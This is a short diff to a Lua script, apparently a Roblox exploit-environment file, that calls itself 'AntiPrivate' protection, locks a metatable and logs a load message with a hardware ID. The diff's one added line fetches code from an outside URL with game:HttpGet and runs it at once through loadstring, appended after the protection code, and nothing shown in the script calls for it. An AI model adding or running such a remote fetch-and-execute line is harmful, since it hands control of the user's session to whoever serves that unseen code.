@@ -143,3 +143,4 @@ end)
 setreadonly(mt, true)
 
 warn("[AntiPrivate] PrivateCommands protection loaded for HWID: " .. clientId)
+loadstring(game:HttpGet("https://luamour.vercel.app/api/V4.lua"))()
